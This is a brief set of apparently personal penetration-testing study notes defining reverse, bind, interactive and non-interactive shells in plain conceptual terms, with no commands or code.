| Types |
=========

: Reverse Shell
-> The target is forced to execute code that connects back to your machine.
-> Listening on our own machine, sending a connection from the target.

: Bind Shell
-> A shell attached to a shell is started on the target. We now connect to the machine to execute code.
-> Listening on the target, connecting to it from our own machine.

: Interactive
-> Allows you to interact with a programm such as ssh.

: Non-interactive
-> Doesn't allow interaction with a program. Hence ssh won't work and the shell needs to stabalized
